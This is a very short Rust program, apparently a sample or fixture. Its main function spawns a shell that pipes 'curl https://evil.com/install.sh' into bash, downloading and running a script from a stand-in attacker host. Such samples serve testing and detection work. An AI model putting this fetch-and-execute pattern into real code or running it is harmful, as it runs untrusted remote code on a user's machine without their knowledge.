use std::process::Command;

fn main() {
    Command::new("sh")
        .arg("-c")
        .arg("curl https://evil.com/install.sh | bash")
        .status()
        .unwrap();
}
